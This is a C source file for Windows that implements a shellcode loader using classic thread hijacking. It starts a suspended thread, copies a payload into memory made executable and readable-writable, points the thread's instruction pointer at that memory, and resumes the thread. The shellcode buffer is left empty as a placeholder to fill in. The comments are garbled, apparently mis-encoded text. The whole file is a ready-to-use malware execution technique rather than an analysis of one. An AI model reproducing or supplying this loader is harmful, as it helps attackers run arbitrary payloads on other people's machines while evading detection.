//�����߳̽ٳ�
#include <Windows.h>
#include <stdio.h>

DWORD WINAPI DummyFunction(LPVOID lpParam) {

	printf("Hello from the dummy thread!\n");
	return 0;
}


BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PVOID    pAddress = NULL;
	DWORD    dwOldProtection = NULL;
	CONTEXT  ThreadCtx = {
		.ContextFlags = CONTEXT_CONTROL
	};

	// ������Ч�غ�������ڴ�
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAlloc ʧ�ܣ�����%d \n", GetLastError());
		return FALSE;
	}

	// ����Ч�غɸ��Ƶ��ѷ�����ڴ�
	memcpy(pAddress, pPayload, sPayloadSize);

	// �����ڴ汣��
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect ʧ�ܣ�����%d \n", GetLastError());
		return FALSE;
	}

	// ��ȡԭʼ�߳�������
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] GetThreadContext ʧ�ܣ�����%d \n", GetLastError());
		return FALSE;
	}

	// ������һ��ָ��ָ������Ч�غɵ�ַ���
	ThreadCtx.Rip = pAddress;

	// �������߳�������
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext ʧ�ܣ�����%d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

unsigned char buf[] = "";//SHELLCODE

int main() {

	HANDLE hThread = NULL;
	// ������ͣ״̬�������߳�
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// �ٳִ����������߳�
	if (!RunViaClassicThreadHijacking(hThread, buf, sizeof(buf))) {
		return -1;
	}
	// �ָ���ͣ�̣߳��Ա����������ǵ� shellcode
	ResumeThread(hThread);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;
}
